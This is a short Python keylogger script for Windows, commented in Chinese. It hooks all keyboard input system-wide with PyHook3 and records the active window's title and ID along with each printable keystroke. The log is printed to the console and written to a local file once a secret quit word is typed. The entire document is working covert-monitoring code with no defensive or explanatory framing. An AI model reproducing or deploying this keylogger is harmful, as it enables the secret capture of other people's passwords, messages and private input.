from ctypes import *  
import pythoncom  
import PyHook3
import win32clipboard  
import os,sys
path=os.getcwd()

user32 = windll.user32  
kernel32 = windll.kernel32  
psapi = windll.psapi
current_window = None
#退出监听的指令单词，可以修改
QUIT_WORD="BIGBANG"
QUIT_CONT=QUIT_WORD
# Fkey=["F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"]
# 定义击键监听事件函数  
def OnKeyboardEvent(event):
    global current_window,QUIT_WORD,QUIT_CONT,path
    FileStr=""
    if(len(QUIT_WORD)==0):
        FileStr+="\n--------------------结束监听--------------------\n\n\n"
    #    fp=open(path+"/KeyBoardListen","a",encoding='utf-8')
    #    fp.write(FileStr)
    #    fp.close()
        print("\n--------------------结束监听--------------------\n")
    #    sys.exit()
        return False
    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)  
    if event.Window != current_window:  
        current_window = event.Window
        # event.WindowName有时候会不好用
        # 所以调用底层API喊来获取窗口标题
        windowTitle = create_string_buffer(512)
        windll.user32.GetWindowTextA(event.Window,
                                     byref(windowTitle),
                                     512)
        windowName = windowTitle.value.decode('gbk')
        FileStr+="\n"+("-"*60)+"\n窗口名:%s\n窗口ID:%s\n"%(windowName,event.Window)
        print("\n-----------------")
        print("窗口名:%s"%windowName)
        print("窗口ID:%s"%event.Window)
    # 检测击键是否常规按键（非组合键等）  
    if event.Ascii > 32 and event.Ascii <127:
        FileStr+=chr(event.Ascii)+' '
        print(chr(event.Ascii),end=' ')

    else:
        pass
    #判断退出监听指令符
    if (event.Key==QUIT_WORD[0]):
        QUIT_WORD=QUIT_WORD[1:]
        if(len(QUIT_WORD)==0):
            FileStr+="\n--------------------结束监听--------------------\n\n\n"
            fp=open(path+"/KeyBoardListen","a",encoding='utf-8')
            fp.write(FileStr)
            fp.close()
            print("\n--------------------结束监听--------------------\n")
            sys.exit()
            return False
    else:
        QUIT_WORD=QUIT_CONT
    #写入文件    
#    fp=open(path+"/KeyBoardListen","a",encoding='utf-8')
#    fp.write(FileStr)
#    fp.close()
    # 循环监听下一个击键事件
    #return True

# 创建并注册hook管理器  
kl = PyHook3.HookManager()  #
kl.KeyDown = OnKeyboardEvent

# 注册hook并执行  
kl.HookKeyboard()
pythoncom.PumpMessages()